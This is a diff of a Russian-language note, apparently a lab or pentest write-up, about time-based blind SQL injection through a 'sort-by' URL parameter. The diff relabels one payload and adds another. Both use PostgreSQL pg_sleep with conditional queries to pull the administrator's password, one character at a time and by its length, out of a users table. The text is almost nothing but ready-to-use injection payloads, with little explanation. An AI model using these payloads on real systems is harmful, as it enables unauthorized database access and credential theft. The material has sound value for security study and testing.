@@ -54,8 +54,14 @@ ORDER BY "usename",
 
 URL: [https://example.com/filtered\_search?SearchTerm=test\&sort-by=AUTHOR\&writer=](https://example.com/filtered\_search?SearchTerm=test\&sort-by=AUTHOR\&writer=)
 
-Payload для sort-by:
+Time-based payload для sort-by для извлечения значения поля password:
 
 ```
 AUTHOR, (CASE WHEN (SELECT '1'='1' FROM users WHERE username = 'administrator' AND password LIKE 'j%') THEN pg_sleep(10)::text ELSE AUTHOR END)
+```
+
+Time-based payload для sort-by для извлечения длины поля password:
+
+```
+(SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 25 THEN pg_sleep(20) ELSE '' END)))<>0 THEN true ELSE false END)
 ```
